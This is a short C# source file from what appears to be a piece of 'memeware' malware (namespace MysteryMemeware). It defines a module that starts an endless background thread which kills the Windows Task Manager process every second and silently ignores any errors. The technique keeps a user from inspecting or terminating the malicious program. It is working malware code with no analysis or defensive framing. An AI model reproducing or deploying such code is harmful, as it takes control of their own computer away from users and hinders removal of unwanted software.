//Approved 07/13/2022
namespace MysteryMemeware
{
    public static class TaskMGRModule
    {
        public static void KillTaskMGR()
        {
            System.Threading.Thread childThread = new System.Threading.Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        System.Diagnostics.Process[] openProcesses = System.Diagnostics.Process.GetProcesses();
                        int openProcessesLength = openProcesses.Length;
                        for (int i = 0; i < openProcessesLength; i++)
                        {
                            try
                            {
                                System.Diagnostics.Process currentProcess = openProcesses[i];
                                if (currentProcess.ProcessName.ToLower() == "taskmgr")
                                {
                                    currentProcess.Kill();
                                }
                            }
                            catch (System.Exception ex)
                            {

                            }
                        }
                    }
                    catch (System.Exception ex)
                    {

                    }
                    System.Threading.Thread.Sleep(1000);
                }
            });
            childThread.Start();
        }
    }
}